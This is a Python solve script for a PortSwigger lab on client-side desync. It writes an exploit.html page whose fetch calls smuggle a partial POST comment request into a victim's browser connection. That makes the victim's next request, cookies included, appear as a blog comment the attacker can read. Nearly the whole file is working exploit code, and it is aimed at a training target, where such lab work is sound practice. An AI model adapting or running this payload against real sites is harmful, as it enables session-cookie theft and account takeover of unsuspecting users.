#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Client-side desync.

Generates a ready-to-use exploit.html file for the given lab URL.
Paste the generated file content into the exploit server body and deliver to victim.

Usage:
    python solve.py <lab_url> <session_cookie> <csrf_token>

Example:
    python solve.py https://abc123.h1-web-security-academy.net bf1jX2MG... EwYLWLGS...
"""

import argparse
import sys


EXPLOIT_TEMPLATE = """\
<!DOCTYPE html>
<html>
<body>
<script>
var smuggledRequest = [
    "POST /en/post/comment HTTP/1.1",
    "Host: {host}",
    "Cookie: session={session}",
    "Content-Length: 500",
    "Content-Type: application/x-www-form-urlencoded",
    "Connection: close",
    "",
    "csrf={csrf}&postId=2&name=Foobie&email=foo@bar.com&website=https://bar.com&comment=Foo",
].join("\\r\\n");

fetch("https://{host}/", {{
    method: "POST",
    body: smuggledRequest,
    credentials: "include",
    mode: "cors",
}}).catch(() => {{
    fetch(
        "https://{host}/en",
        {{
            mode: "no-cors",
            credentials: "include",
        }}
    );
}});
</script>
</body>
</html>"""


def main():
    parser = argparse.ArgumentParser(description="Generate CSD exploit HTML")
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("session", help="Your session cookie value")
    parser.add_argument("csrf", help="CSRF token from comment form")
    parser.add_argument("--out", default="exploit_generated.html")
    args = parser.parse_args()

    host = args.lab_url.rstrip("/").replace("https://", "").replace("http://", "")
    html = EXPLOIT_TEMPLATE.format(host=host, session=args.session, csrf=args.csrf)

    with open(args.out, "w") as f:
        f.write(html)

    print(f"[+] Exploit written to {args.out}")
    print(f"[*] Paste contents into the exploit server body and deliver to victim.")
    print(f"[*] Then check https://{host}/en/post?postId=2 for the victim's cookie in comments.")


if __name__ == "__main__":
    main()
